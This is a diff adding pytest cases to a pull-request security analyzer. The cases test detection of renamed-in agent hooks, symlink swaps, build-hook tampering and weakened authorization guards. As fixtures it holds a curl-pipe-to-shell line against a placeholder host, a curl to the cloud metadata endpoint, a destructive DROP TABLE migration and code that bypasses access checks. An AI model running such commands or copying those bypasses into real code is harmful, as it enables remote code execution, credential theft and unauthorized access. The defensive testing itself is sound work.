@@ -2170,3 +2170,724 @@ class TestDetectorD10AndExtendedIntegrity:
         ])
         d06_findings = [f for f in rep.findings if f.consequence_class == "SECURITY_GUARD_WEAKENED"]
         assert len(d06_findings) == 0
+
+
+# ==============================================================================
+# 7. ROUND-3 ADVERSARIAL EVALUATION FIXES (AUDIT_LOG, Audit Run: 2026-10-29)
+# ==============================================================================
+
+def _r3_git(repo, *args):
+    return repo.git.execute(["git", *args])
+
+
+def _r3_stage(repo, root, files):
+    """Write ``files`` ({path: str | bytes}) into the work tree and stage them."""
+    for rel, content in files.items():
+        p = root / rel
+        p.parent.mkdir(parents=True, exist_ok=True)
+        if isinstance(content, bytes):
+            p.write_bytes(content)
+        else:
+            p.write_bytes(content.encode("utf-8"))
+        _r3_git(repo, "add", "--", rel)
+
+
+def _r3_move(repo, root, src, dst):
+    (root / dst).parent.mkdir(parents=True, exist_ok=True)
+    _r3_git(repo, "mv", src, dst)
+
+
+def _r3_stage_symlink(repo, root, rel, target):
+    """Stage ``rel`` as a Git symlink (mode 120000) to ``target`` without creating an OS symlink."""
+    tmp = root.parent / f"{root.name}-symlink-target"
+    tmp.write_bytes(target.encode("utf-8"))
+    sha = _r3_git(repo, "hash-object", "-w", str(tmp)).strip()
+    tmp.unlink()
+    _r3_git(repo, "update-index", "--add", "--cacheinfo", f"120000,{sha},{rel}")
+
+
+def _r3_repo(tmp_path, base_files, edit, base_edit=None):
+    """Commit ``base_files`` (and ``base_edit(repo, root)``) as ``main``, apply ``edit(repo, root)``
+    on branch ``feature`` and commit."""
+    import git
+
+    root = tmp_path / "repo"
+    root.mkdir()
+    repo = git.Repo.init(root)
+    with repo.config_writer() as cw:
+        cw.set_value("user", "name", "Test")
+        cw.set_value("user", "email", "test@example.com")
+        cw.set_value("core", "autocrlf", "false")
+    _r3_stage(repo, root, base_files)
+    if base_edit is not None:
+        base_edit(repo, root)
+    _r3_git(repo, "commit", "-q", "-m", "base")
+    repo.create_head("main")
+    repo.create_head("feature").checkout()
+    edit(repo, root)
+    _r3_git(repo, "commit", "-q", "-m", "head")
+    return root
+
+
+def _r3_analyze(root, mode="enforce", description="Update files"):
+    from analyze import PayloadAnalyzer, PayloadGuardConfig
+
+    cfg = PayloadGuardConfig()
+    cfg.consequence["mode"] = mode
+    return PayloadAnalyzer(str(root), "feature", "main", config=cfg).analyze(pr_description=description)
+
+
+def _r3_findings(rep, detector=None):
+    return [
+        f for f in rep["consequence_analysis"].get("findings", [])
+        if detector is None or f["detector_id"] == detector
+    ]
+
+
+_R3_SESSION_HOOK = json.dumps({
+    "hooks": {"SessionStart": [{"hooks": [{"type": "command", "command": "node .github/setup.js"}]}]}
+})
+
+
+class TestRound3RenameActivation:
+    """MOVE-01: a rename into an active config, workflow, build or migration path activates its content."""
+
+    def test_rename_into_claude_settings_is_scanned(self, tmp_path):
+        root = _r3_repo(
+            tmp_path,
+            {"samples/settings.json": _R3_SESSION_HOOK, ".github/setup.js": "console.log('setup')\n"},
+            lambda repo, root: _r3_move(repo, root, "samples/settings.json", ".claude/settings.json"),
+        )
+        for mode in ("shadow", "advisory", "enforce"):
+            rep = _r3_analyze(root, mode, "Move agent settings")
+            assert rep["files"]["renamed"] == 1
+            types = [s["type"] for fl in rep["ai_config_poisoning"]["flagged_configs"] for s in fl["signals"]]
+            assert "command_in_session_hook" in types
+            assert rep["verdict"]["status"] == "DESTRUCTIVE"
+
+    def test_rename_between_inactive_paths_is_not_flagged(self, tmp_path):
+        root = _r3_repo(
+            tmp_path,
+            {"samples/settings.json": _R3_SESSION_HOOK},
+            lambda repo, root: _r3_move(repo, root, "samples/settings.json", "examples/settings.json"),
+        )
+        rep = _r3_analyze(root, "enforce", "Move example settings")
+        assert rep["ai_config_poisoning"]["total"] == 0
+        assert rep["verdict"]["status"] == "SAFE"
+
+    def test_rename_into_workflow_directory_is_scanned(self, tmp_path):
+        wf = (
+            "name: triage\n"
+            "on: issues\n"
+            "jobs:\n"
+            "  t:\n"
+            "    runs-on: ubuntu-latest\n"
+            "    steps:\n"
+            "      - run: echo \"${{ github.event.issue.title }}\"\n"
+            "      - run: curl http://169.254.169.254/latest/meta-data/\n"
+        )
+        root = _r3_repo(
+            tmp_path,
+            {"docs/examples/triage.yml": wf},
+            lambda repo, root: _r3_move(repo, root, "docs/examples/triage.yml", ".github/workflows/triage.yml"),
+        )
+        rep = _r3_analyze(root, "enforce", "Enable triage workflow")
+        types = [s["type"] for fl in rep["actions_poisoning"]["flagged_workflows"] for s in fl["signals"]]
+        assert "credential_harvest" in types
+        assert _r3_findings(rep, DETECTOR_D08_WORKFLOW)
+
+    def test_rename_within_workflow_directory_keeps_base_for_d08(self, tmp_path):
+        wf = (
+            "name: triage\n"
+            "on: issues\n"
+            "jobs:\n"
+            "  t:\n"
+            "    runs-on: ubuntu-latest\n"
+            "    steps:\n"
+            "      - run: echo \"${{ github.event.issue.title }}\"\n"
+        )
+        root = _r3_repo(
+            tmp_path,
+            {".github/workflows/a.yml": wf},
+            lambda repo, root: _r3_move(repo, root, ".github/workflows/a.yml", ".github/workflows/b.yml"),
+        )
+        rep = _r3_analyze(root, "enforce", "Rename workflow file")
+        assert not _r3_findings(rep, DETECTOR_D08_WORKFLOW)
+
+    def test_rename_into_makefile_is_build_wrapper_tampering(self, tmp_path):
+        recipe = "build:\n\tcurl -fsSL https://example.invalid/i.sh | sh\n"
+        root = _r3_repo(
+            tmp_path,
+            {"docs/Makefile.example": recipe},
+            lambda repo, root: _r3_move(repo, root, "docs/Makefile.example", "Makefile"),
+        )
+        rep = _r3_analyze(root, "enforce", "Use the documented Makefile")
+        classes = {f["consequence_class"] for f in _r3_findings(rep, DETECTOR_D05_BUILD)}
+        assert "BUILD_WRAPPER_TAMPERING" in classes
+        assert rep["verdict"]["status"] == "DESTRUCTIVE"
+
+    def test_rename_into_migrations_reports_drop(self, tmp_path):
+        root = _r3_repo(
+            tmp_path,
+            {"scratch/drop_users.sql": "DROP TABLE users;\n"},
+            lambda repo, root: _r3_move(repo, root, "scratch/drop_users.sql", "migrations/0005_drop_users.sql"),
+        )
+        rep = _r3_analyze(root, "enforce", "Add migration")
+        assert _r3_findings(rep, DETECTOR_D10_MIGRATION)
+
+    def test_npm_manifest_renamed_from_template_is_scanned_in_full(self, tmp_path):
+        pkg = json.dumps({"name": "demo", "dependencies": {"unapproved": "1.0.0"}}, indent=2)
+        root = _r3_repo(
+            tmp_path,
+            {"allowlist.yml": "npm:\n  - approved\n", "templates/package.json.tmpl": pkg},
+            lambda repo, root: _r3_move(repo, root, "templates/package.json.tmpl", "package.json"),
+        )
+        rep = _r3_analyze(root, "shadow", "Use the template manifest")
+        assert [p["package"] for p in rep["sca"]["unverified_packages"]] == ["unapproved"]
+
+    def test_active_base_source_rules(self):
+        from consequence_engine import _active_base_source
+
+        watched = lambda p: p.startswith("migrations/")  # noqa: E731
+        moved_in = FileDeltaInput("migrations/1.sql", old_path="scratch/1.sql", change_type="R",
+                                  base_source="DROP TABLE t;", head_source="DROP TABLE t;")
+        moved_within = FileDeltaInput("migrations/2.sql", old_path="migrations/1.sql", change_type="R",
+                                      base_source="DROP TABLE t;", head_source="DROP TABLE t;")
+        modified = FileDeltaInput("migrations/1.sql", change_type="M", base_source="a", head_source="b")
+        assert _active_base_source(moved_in, watched) == ""
+        assert _active_base_source(moved_within, watched) == "DROP TABLE t;"
+        assert _active_base_source(modified, watched) == "a"
+
+
+_R3_GUARDED = "def check_access(user):\n    if not user.is_admin:\n        raise PermissionError()\n    return True\n"
+_R3_PERMISSIVE = "def check_access(user):\n    return True\n"
+
+
+class TestRound3SymlinkTypeChange:
+    """TYPE01: a source file replaced by a symlink is analysed through the link target."""
+
+    def test_regular_file_to_symlink_is_analysed_through_target(self, tmp_path):
+        root = _r3_repo(
+            tmp_path,
+            {"auth.py": _R3_GUARDED, "permissive.py": _R3_PERMISSIVE},
+            lambda repo, root: _r3_stage_symlink(repo, root, "auth.py", "permissive.py"),
+        )
+        rep = _r3_analyze(root, "enforce", "Point auth at the shared implementation")
+        assert rep["files"]["type_changed"] == 1
+        classes = {f["consequence_class"] for f in _r3_findings(rep)}
+        assert {"SOURCE_REPLACED_BY_SYMLINK", "SECURITY_GUARD_REMOVED"} <= classes
+        assert rep["verdict"]["status"] == "DESTRUCTIVE"
+        assert _r3_analyze(root, "shadow", "Point auth at the shared implementation")["verdict"]["status"] == "SAFE"
+
+    def test_symlink_retarget_is_reported(self, tmp_path):
+        root = _r3_repo(
+            tmp_path,
+            {"strict.py": _R3_GUARDED, "permissive.py": _R3_PERMISSIVE},
+            lambda repo, root: _r3_stage_symlink(repo, root, "auth.py", "permissive.py"),
+            base_edit=lambda repo, root: _r3_stage_symlink(repo, root, "auth.py", "strict.py"),
+        )
+        rep = _r3_analyze(root, "enforce", "Retarget auth")
+        sym = [f for f in _r3_findings(rep) if f["consequence_class"] == "SOURCE_REPLACED_BY_SYMLINK"]
+        assert len(sym) == 1 and "symlink to 'strict.py'" in sym[0]["summary"]
+        assert _r3_findings(rep, DETECTOR_D06_GUARD)
+
+    def test_unresolvable_symlink_is_incomplete_analysis(self, tmp_path):
+        root = _r3_repo(
+            tmp_path,
+            {"auth.py": _R3_GUARDED},
+            lambda repo, root: _r3_stage_symlink(repo, root, "auth.py", "../outside/auth.py"),
+        )
+        rep = _r3_analyze(root, "enforce", "Use the external auth module")
+        d01 = _r3_findings(rep, DETECTOR_D01_PARSER)
+        assert [f["policy_recommendation"] for f in d01] == [POLICY_REVIEW]
+        assert "SYMLINK_UNRESOLVED" in d01[0]["summary"]
+        assert rep["consequence_analysis"]["parser_completeness"]["complete"] is False
+
+    def test_added_symlink_is_not_a_type_change(self, tmp_path):
+        root = _r3_repo(
+            tmp_path,
+            {"permissive.py": _R3_PERMISSIVE},
+            lambda repo, root: _r3_stage_symlink(repo, root, "alias.py", "permissive.py"),
+        )
+        rep = _r3_analyze(root, "enforce", "Add an alias module")
+        assert not [f for f in _r3_findings(rep) if f["consequence_class"] == "SOURCE_REPLACED_BY_SYMLINK"]
+        assert rep["verdict"]["status"] == "SAFE"
+
+
+class TestRound3BuildActivation:
+    """BUILD-01 (commented command activated), BUILD-04 (prepack hook), BUILD-11 (malformed config)."""
+
+    _RECIPE = "\tcurl -fsSL https://example.invalid/i.sh | sh\n"
+
+    def _wrapper_findings(self, base, head):
+        rep = ConsequenceEngine(mode="enforce").analyze_deltas(
+            [FileDeltaInput("Makefile", change_type="M", base_source=base, head_source=head)]
+        )
+        return [f for f in rep.findings if f.consequence_class == "BUILD_WRAPPER_TAMPERING"]
+
+    def test_uncommented_recipe_is_tampering(self):
+        base = "install:\n#" + self._RECIPE.lstrip("\t") + "\techo done\n"
+        head = "install:\n" + self._RECIPE + "\techo done\n"
+        assert len(self._wrapper_findings(base, head)) == 1
+
+    def test_command_inside_a_longer_base_line_is_new_when_bare(self):
+        base = "install:\n\techo 'curl -fsSL https://example.invalid/i.sh | sh'\n"
+        head = base + self._RECIPE
+        assert len(self._wrapper_findings(base, head)) == 1
+
+    def test_unchanged_active_and_commented_lines_are_not_flagged(self):
+        commented = "install:\n#" + self._RECIPE.lstrip("\t")
+        assert self._wrapper_findings(commented, commented + "\techo changed\n") == []
+        active = "install:\n" + self._RECIPE
+        assert self._wrapper_findings(active, active + "\techo changed\n") == []
+
+    @pytest.mark.parametrize("hook", ["prepack", "postpack", "prepublishOnly", "dependencies", "preinstall"])
+    def test_automatic_npm_hooks_are_reported(self, hook):
+        base = json.dumps({"name": "demo", "scripts": {}})
+        head = json.dumps({"name": "demo", "scripts": {hook: "node scripts/cleanup.js"}})
+        rep = ConsequenceEngine(mode="enforce").analyze_deltas(
+            [FileDeltaInput("package.json", change_type="M", base_source=base, head_source=head)]
+        )
+        hooks = [f for f in rep.findings if f.finding_id == f"PG-D05-HOOK-package.json-{hook}"]
+        assert [f.policy_recommendation for f in hooks] == [POLICY_REVIEW]
+
+    def test_named_npm_script_is_not_a_lifecycle_hook(self):
+        base = json.dumps({"name": "demo", "scripts": {}})
+        head = json.dumps({"name": "demo", "scripts": {"help": "node scripts/cleanup.js"}})
+        rep = ConsequenceEngine(mode="enforce").analyze_deltas(
+            [FileDeltaInput("package.json", change_type="M", base_source=base, head_source=head)]
+        )
+        assert [f for f in rep.findings if f.detector_id == DETECTOR_D05_BUILD] == []
+
+    @pytest.mark.parametrize("path,content", [
+        (".vscode/tasks.json", '{"version": "2.0.0", "tasks": [{"label": "x", "runOptions": null}]}'),
+        (".vscode/tasks.json", '{"tasks": 5}'),
+        (".claude/settings.json", "[]"),
+        (".claude/settings.json", '{"hooks": {"SessionStart": [{"hooks": 5}]}}'),
+        ("package.json", "[]"),
+        ("composer.json", "null"),
+        ("mcp.json", '["server"]'),
+    ])
+    def test_valid_json_of_unexpected_shape_does_not_abort(self, tmp_path, path, content):
+        root = _r3_repo(
+            tmp_path,
+            {"README.md": "demo\n"},
+            lambda repo, root: _r3_stage(repo, root, {path: content}),
+        )
+        rep = _r3_analyze(root, "enforce", "Add editor configuration")
+        assert "error" not in rep
+        assert rep["verdict"]["status"] == "SAFE"
+
+
+_R3_AUTHZ = "def authorize(actor):\n    if not actor['allowed']:\n        raise PermissionError('denied')\n\n"
+_R3_VERIFY = "def verify_token(token):\n    return token == 'trusted'\n\n"
+_R3_UPDATE = "def update(actor, store, value):\n    authorize(actor)\n    store.write(value)\n    return 'done'\n"
+_R3_READ = (
+    "def read_private(token, store):\n    if not verify_token(token):\n"
+    "        raise PermissionError('denied')\n    return store.read()\n"
+)
+_R3_STATE = (
+    "def read_private(actor, store):\n    if not actor['authenticated'] or not actor['active']:\n"
+    "        raise PermissionError('denied')\n    return store.read()\n"
+)
+
+
+def _r3_d06(base, head, extra_head_files=None):
+    rep = ConsequenceEngine(mode="enforce").analyze_deltas(
+        [FileDeltaInput("service.py", change_type="M", base_source=base, head_source=head)],
+        extra_head_files or {},
+    )
+    return [(f.policy_recommendation, e.kind) for f in rep.findings if f.detector_id == DETECTOR_D06_GUARD
+            for e in f.evidence]
+
+
+_R3_GUARD_CASES = {
+    # Round-3 misses and their campaign controls (security-round3/RESULTS.md).
+    "SEC01 swallowed": (_R3_AUTHZ + _R3_UPDATE, _R3_AUTHZ + _R3_UPDATE.replace(
+        "    authorize(actor)\n", "    try:\n        authorize(actor)\n    except PermissionError:\n        pass\n"),
+        "GUARD_EXCEPTION_SWALLOWED"),
+    "SEC02 rethrown": (_R3_AUTHZ + _R3_UPDATE, _R3_AUTHZ + _R3_UPDATE.replace(
+        "    authorize(actor)\n", "    try:\n        authorize(actor)\n    except PermissionError:\n        raise\n"),
+        None),
+    "suppress()": (_R3_AUTHZ + _R3_UPDATE, _R3_AUTHZ + _R3_UPDATE.replace(
+        "    authorize(actor)\n", "    with suppress(PermissionError):\n        authorize(actor)\n"),
+        "GUARD_EXCEPTION_SWALLOWED"),
+    "SEC03 write first": (_R3_AUTHZ + _R3_UPDATE, _R3_AUTHZ + _R3_UPDATE.replace(
+        "    authorize(actor)\n    store.write(value)\n", "    store.write(value)\n    authorize(actor)\n"),
+        "GUARD_AFTER_PROTECTED_CALL"),
+    "SEC04 log first": (_R3_AUTHZ + _R3_UPDATE, _R3_AUTHZ + _R3_UPDATE.replace(
+        "    authorize(actor)\n", "    store.log_attempt(actor)\n    authorize(actor)\n"),
+        None),
+    "read moved first": (_R3_AUTHZ + _R3_UPDATE.replace("    store.write", "    data = store.load(actor)\n    store.write"),
+                         _R3_AUTHZ + _R3_UPDATE.replace("    authorize(actor)\n",
+                                                        "    data = store.load(actor)\n    authorize(actor)\n"),
+                         None),
+    "SEC06 optional": (_R3_AUTHZ + _R3_UPDATE.replace("value)", "value, enforce=True)", 1),
+                       _R3_AUTHZ + _R3_UPDATE.replace("value)", "value, enforce=True)", 1).replace(
+                           "    authorize(actor)\n", "    if enforce:\n        authorize(actor)\n"),
+                       "GUARD_MADE_CONDITIONAL"),
+    "SEC07 required": (_R3_AUTHZ + _R3_UPDATE.replace("value)", "value, enforce=True)", 1),
+                       _R3_AUTHZ + _R3_UPDATE.replace("value)", "value, enforce=True)", 1).replace(
+                           "    authorize(actor)\n",
+                           "    if not enforce:\n        raise ValueError('required')\n    authorize(actor)\n"),
+                       None),
+    "both branches": (_R3_AUTHZ + _R3_UPDATE, _R3_AUTHZ + _R3_UPDATE.replace(
+        "    authorize(actor)\n",
+        "    if actor.get('service'):\n        authorize(actor['owner'])\n    else:\n        authorize(actor)\n"),
+        None),
+    "branch given another guard": (_R3_AUTHZ + _R3_UPDATE, _R3_AUTHZ + _R3_UPDATE.replace(
+        "    authorize(actor)\n",
+        "    if actor.get('service'):\n        verify_signature(actor)\n    else:\n        authorize(actor)\n"),
+        None),
+    "early return with effect": (_R3_AUTHZ + _R3_UPDATE, _R3_AUTHZ + _R3_UPDATE.replace(
+        "    authorize(actor)\n",
+        "    if actor.get('fast'):\n        store.write(value)\n        return 'done'\n    authorize(actor)\n"),
+        "GUARD_MADE_CONDITIONAL"),
+    "early return of nothing": (_R3_AUTHZ + _R3_UPDATE, _R3_AUTHZ + _R3_UPDATE.replace(
+        "    authorize(actor)\n", "    if value is None:\n        return None\n    authorize(actor)\n"),
+        None),
+    "SEC12 lazy": (_R3_AUTHZ + _R3_UPDATE, _R3_AUTHZ + _R3_UPDATE.replace(
+        "    authorize(actor)\n", "    check = (authorize(actor) for _ in (1,))\n"),
+        "GUARD_CALL_DEFERRED"),
+    "SEC13 consumed": (_R3_AUTHZ + _R3_UPDATE, _R3_AUTHZ + _R3_UPDATE.replace(
+        "    authorize(actor)\n", "    list(authorize(actor) for _ in (1,))\n"),
+        None),
+    "lambda called later": (_R3_AUTHZ + _R3_UPDATE, _R3_AUTHZ + _R3_UPDATE.replace(
+        "    authorize(actor)\n", "    check = lambda: authorize(actor)\n    check()\n"),
+        None),
+    "SEC14 or to and": (_R3_STATE, _R3_STATE.replace(" or not actor", " and not actor"), "GUARD_CONDITION_WEAKENED"),
+    "SEC15 reordered": (_R3_STATE, _R3_STATE.replace(
+        "not actor['authenticated'] or not actor['active']", "not actor['active'] or not actor['authenticated']"),
+        None),
+    "SEC08 is False": (_R3_VERIFY + _R3_READ, _R3_VERIFY + _R3_READ.replace(
+        "if not verify_token(token):", "if verify_token(token) is False:"), None),
+    "condition in new terms": (_R3_STATE, _R3_STATE.replace(
+        "not actor['authenticated'] or not actor['active']", "not actor.can_read()"), None),
+    "SEC19 discarded": (_R3_VERIFY + _R3_READ, _R3_VERIFY + _R3_READ.replace(
+        "    if not verify_token(token):\n        raise PermissionError('denied')\n", "    verify_token(token)\n"),
+        "GUARD_RESULT_DISCARDED"),
+    "SEC20 assigned": (_R3_VERIFY + _R3_READ, _R3_VERIFY + _R3_READ.replace(
+        "    if not verify_token(token):\n",
+        "    valid = verify_token(token)\n    if not valid:\n"), None),
+    # SEC10/SEC11: guards moved into helpers.
+    "SEC10 helper": (_R3_AUTHZ + _R3_UPDATE, _R3_AUTHZ
+                     + "def ensure_can_update(actor):\n    authorize(actor)\n\n"
+                     + _R3_UPDATE.replace("    authorize(actor)\n", "    ensure_can_update(actor)\n"), None),
+    "SEC11 no-op helper": (_R3_AUTHZ + _R3_UPDATE, _R3_AUTHZ
+                           + "def ensure_can_update(actor):\n    return True\n\n"
+                           + _R3_UPDATE.replace("    authorize(actor)\n", "    ensure_can_update(actor)\n"),
+                           "GUARD_CALL_REMOVED"),
+    "swallowing helper": (_R3_AUTHZ + _R3_UPDATE, _R3_AUTHZ
+                          + "def ensure_can_update(actor):\n    try:\n        authorize(actor)\n"
+                            "    except PermissionError:\n        pass\n\n"
+                          + _R3_UPDATE.replace("    authorize(actor)\n", "    ensure_can_update(actor)\n"),
+                          "GUARD_CALL_REMOVED"),
+    "conditionally called helper": (_R3_AUTHZ + _R3_UPDATE, _R3_AUTHZ
+                                    + "def ensure_can_update(actor):\n    authorize(actor)\n\n"
+                                    + _R3_UPDATE.replace("    authorize(actor)\n",
+                                                         "    if value:\n        ensure_can_update(actor)\n"),
+                                    "GUARD_CALL_REMOVED"),
+    "predicate helper denies": (_R3_VERIFY + _R3_READ, _R3_VERIFY
+                                + "def require_token(token):\n    if not verify_token(token):\n"
+                                  "        raise PermissionError('denied')\n\n"
+                                + _R3_READ.replace("    if not verify_token(token):\n        raise PermissionError('denied')\n",
+                                                   "    require_token(token)\n"), None),
+    "state clause moved to helper": (_R3_STATE, _R3_STATE.replace(
+        "def read_private(actor, store):\n    if not actor['authenticated'] or not actor['active']:\n"
+        "        raise PermissionError('denied')\n",
+        "def require_reader(actor):\n    if not actor['authenticated'] or not actor['active']:\n"
+        "        raise PermissionError('denied')\n\n"
+        "def read_private(actor, store):\n    require_reader(actor)\n"), None),
+    "state clause weakened in helper": (_R3_STATE, _R3_STATE.replace(
+        "def read_private(actor, store):\n    if not actor['authenticated'] or not actor['active']:\n"
+        "        raise PermissionError('denied')\n",
+        "def require_reader(actor):\n    if not actor['authenticated'] and not actor['active']:\n"
+        "        raise PermissionError('denied')\n\n"
+        "def read_private(actor, store):\n    require_reader(actor)\n"), "GUARD_CLAUSE_REMOVED"),
+    "predicate helper ignores": (_R3_VERIFY + _R3_READ, _R3_VERIFY
+                                 + "def require_token(token):\n    verify_token(token)\n\n"
+                                 + _R3_READ.replace("    if not verify_token(token):\n        raise PermissionError('denied')\n",
+                                                    "    require_token(token)\n"), "GUARD_CALL_REMOVED"),
+}
+
+
+class TestRound3GuardRegressions:
+    """SEC01/03/06/12/14/19 (missed guard regressions) and SEC10 (helper extraction false positive)."""
+
+    @pytest.mark.parametrize("case", sorted(_R3_GUARD_CASES))
+    def test_guard_case(self, case):
+        base, head, expected = _R3_GUARD_CASES[case]
+        found = _r3_d06(base, head)
+        if expected is None:
+            assert found == [], found
+        else:
+            assert (POLICY_BLOCK, expected) in found, found
+
+    def test_helper_in_unchanged_file_is_resolved(self):
+        helpers = "from authz import authorize\n\ndef ensure_can_update(actor):\n    authorize(actor)\n"
+        head = _R3_UPDATE.replace("    authorize(actor)\n", "    ensure_can_update(actor)\n")
+        assert _r3_d06(_R3_UPDATE, head, {"guards.py": helpers}) == []
+
+    def test_ambiguous_helper_must_enforce_in_every_definition(self):
+        good = "def ensure_can_update(actor):\n    authorize(actor)\n"
+        bad = "def ensure_can_update(actor):\n    return True\n"
+        head = _R3_UPDATE.replace("    authorize(actor)\n", "    ensure_can_update(actor)\n")
+        found = _r3_d06(_R3_UPDATE, head, {"a.py": good, "b.py": bad})
+        assert (POLICY_BLOCK, "GUARD_CALL_REMOVED") in found
+
+    def test_execution_facts(self):
+        src = (
+            "def f(a, s, c):\n"
+            "    try:\n        authorize(a)\n    except Exception:\n        log(a)\n"
+            "    gen = (verify(x) for x in a)\n"
+            "    if c:\n        return s.read()\n"
+            "    s.write(1)\n"
+            "    return s.close()\n"
+            "    s.unreachable()\n"
+        )
+        conds = extract_symbols(src, "m.py").symbols[0].guard_conditions
+        facts = {c for c in conds if c.startswith(("call_exec:", "result_discarded:"))}
+        assert "call_exec:0:-:swallowed:authorize" in facts
+        assert "call_exec:1:-:deferred:verify" in facts
+        assert "call_exec:2:-:conditional:s.read" in facts
+        assert "call_exec:3:-:bypassable:s.write" in facts
+        assert "call_exec:5:-:unreachable:s.unreachable" in facts
+        assert "result_discarded:authorize" in facts and "result_discarded:s.read" not in facts
+
+
+_R3_API_BASE = "def publish(item):\n    return item\n"
+_R3_API_HEAD = "def publish(item, metadata):\n    return item, metadata\n"
+_R3_CALLER = "from api import publish\n\ndef run():\n    return publish('x')\n"
+
+
+class TestRound3CallerIndexCoverage:
+    """IDX-02 (caller beyond the index budget), CTX01 (unparsed indexed file), DUP01 (head error)."""
+
+    def _sig_findings(self, rep):
+        return [f for f in rep.findings if f.consequence_class == "PUBLIC_API_SIGNATURE_BREAK"]
+
+    def _filler(self, n):
+        return {f"aaa/filler_{i:03d}.py": f"def filler_{i}():\n    return {i}\n" for i in range(n)}
+
+    def test_caller_beyond_budget_is_reported_as_unchecked(self):
+        files = {**self._filler(6), "zzz/caller.py": _R3_CALLER}
+        rep = ConsequenceEngine(mode="enforce", max_repo_files=5).analyze_deltas(
+            [FileDeltaInput("api.py", change_type="M", base_source=_R3_API_BASE, head_source=_R3_API_HEAD)], files,
+        )
+        sig = self._sig_findings(rep)
+        assert [f.policy_recommendation for f in sig] == [POLICY_REVIEW]
+        assert "CALLER_INDEX_INCOMPLETE" in {e.kind for e in sig[0].evidence}
+        assert rep.capabilities["reachability"]["state"] == "partial"
+        cov = rep.graph_summary["caller_index"]
+        assert (cov["indexed_files"], cov["source_files"], cov["truncated"]) == (6, 8, True)
+
+    def test_referencing_files_are_indexed_first(self):
+        files = {**self._filler(6), "zzz/caller.py": _R3_CALLER}
+        seen = []
+
+        def loader(names):
+            seen.append(set(names))
+            return {"zzz/caller.py": _R3_CALLER}
+
+        rep = ConsequenceEngine(mode="enforce", max_repo_files=5).analyze_deltas(
+            [FileDeltaInput("api.py", change_type="M", base_source=_R3_API_BASE, head_source=_R3_API_HEAD)],
+            files, reference_loader=loader,
+        )
+        assert seen == [{"publish"}]
+        assert [f.policy_recommendation for f in self._sig_findings(rep)] == [POLICY_BLOCK]
+
+    def test_complete_index_is_available_without_note(self):
+        rep = ConsequenceEngine(mode="enforce").analyze_deltas(
+            [FileDeltaInput("api.py", change_type="M", base_source=_R3_API_BASE, head_source=_R3_API_HEAD)],
+            {"other.py": "def other():\n    return 1\n"}, repo_source_file_count=2,
+        )
+        sig = self._sig_findings(rep)
+        assert [f.policy_recommendation for f in sig] == [POLICY_REVIEW]
+        assert "CALLER_INDEX_INCOMPLETE" not in {e.kind for e in sig[0].evidence}
+        assert rep.capabilities["reachability"]["state"] == "available"
+
+    def test_unparsed_indexed_file_is_reported(self):
+        rep = ConsequenceEngine(mode="enforce").analyze_deltas(
+            [FileDeltaInput("api.py", change_type="M", base_source=_R3_API_BASE, head_source=_R3_API_HEAD)],
+            {"consumer.py": "def run(:\n    publish('x')\n"},
+        )
+        index = [f for f in rep.findings if f.finding_id == "PG-D01-INDEX"]
+        assert [f.policy_recommendation for f in index] == [POLICY_WARN]
+        assert index[0].affected_files == ("consumer.py",)
+        assert rep.capabilities["reachability"]["state"] == "partial"
+        assert rep.parser_completeness["complete"] is True  # changed files parsed
+        assert rep.graph_summary["caller_index"]["unparsed_files"][0]["status"] == PARSER_STATUS_PARSE_ERROR
+
+    def test_unparsed_index_without_api_change_is_not_a_finding(self):
+        rep = ConsequenceEngine(mode="enforce").analyze_deltas(
+            [FileDeltaInput("api.py", change_type="M", base_source=_R3_API_BASE,
+                            head_source=_R3_API_BASE + "\n# note\n")],
+            {"consumer.py": "def run(:\n"},
+        )
+        assert not [f for f in rep.findings if f.finding_id == "PG-D01-INDEX"]
+        assert rep.capabilities["reachability"]["state"] == "partial"
+
+    def test_head_parse_error_survives_identical_base_error(self):
+        broken = "def check(:\n    pass\n"
+        rep = ConsequenceEngine(mode="enforce").analyze_deltas(
+            [FileDeltaInput("security.py", change_type="M", base_source=broken, head_source=broken + "# x\n")]
+        )
+        d01 = [f for f in rep.findings if f.detector_id == DETECTOR_D01_PARSER]
+        assert [f.policy_recommendation for f in d01] == [POLICY_REVIEW]
+        assert "(base and head)" in d01[0].summary
+
+    def test_base_only_parse_error_stays_a_warning(self):
+        rep = ConsequenceEngine(mode="enforce").analyze_deltas(
+            [FileDeltaInput("security.py", change_type="M", base_source="def check(:\n",
+                            head_source="def check():\n    pass\n")]
+        )
+        d01 = [f for f in rep.findings if f.detector_id == DETECTOR_D01_PARSER]
+        assert [f.policy_recommendation for f in d01] == [POLICY_WARN]
+
+    def test_git_grep_finds_caller_past_the_budget(self, tmp_path):
+        filler = {f"aaa/filler_{i:03d}.py": f"def filler_{i}():\n    return {i}\n" for i in range(8)}
+
+        def base_files():
+            return {**filler, "api.py": _R3_API_BASE, "zzz/caller.py": _R3_CALLER,
+                    "payloadguard.yml": "consequence:\n  max_repo_files: 5\n"}
+
+        root = _r3_repo(tmp_path, base_files(),
+                        lambda repo, root: _r3_stage(repo, root, {"api.py": _R3_API_HEAD}))
+        from analyze import PayloadAnalyzer, load_config
+
+        cfg = load_config(str(root), ref="main")
+        cfg.consequence["mode"] = "enforce"
+        rep = PayloadAnalyzer(str(root), "feature", "main", config=cfg).analyze(pr_description="Require metadata")
+        sig = [f for f in rep["consequence_analysis"]["findings"]
+               if f["consequence_class"] == "PUBLIC_API_SIGNATURE_BREAK"]
+        assert [f["policy_recommendation"] for f in sig] == [POLICY_BLOCK]
+        cov = rep["consequence_analysis"]["graph_summary"]["caller_index"]
+        assert cov["source_files"] == 10 and cov["truncated"] is True
+        assert rep["verdict"]["status"] == "DESTRUCTIVE"
+
+
+class TestRound3SourceEncoding:
+    """ENC01: source bytes are decoded as their language reads them, never lossily."""
+
+    def test_decode_source(self):
+        from analyze import _decode_source
+
+        latin1 = "# -*- coding: latin-1 -*-\ndef check_\xe1():\n    pass\n".encode("latin-1")
+        assert _decode_source(latin1, "api.py") == (latin1.decode("latin-1"), None)
+        assert _decode_source("def ok(): pass\n".encode("utf-8-sig"), "a.py") == ("def ok(): pass\n", None)
+        assert _decode_source("const a = 1;\n".encode("utf-8-sig"), "a.js") == ("const a = 1;\n", None)
+        text, error = _decode_source(b"def check_\xe1():\n    pass\n", "api.py")
+        assert text == "def check_\xe1():\n    pass\n" and "invalid or missing encoding declaration" in error
+        text, error = _decode_source(b"x = 1\n\n\ns = 'caf\xe9'\n", "late.py")
+        assert text == "x = 1\n\n\ns = 'caf\xe9'\n" and "not valid utf-8" in error
+        text, error = _decode_source(b"const check_\xe1 = 1;\n", "api.js")
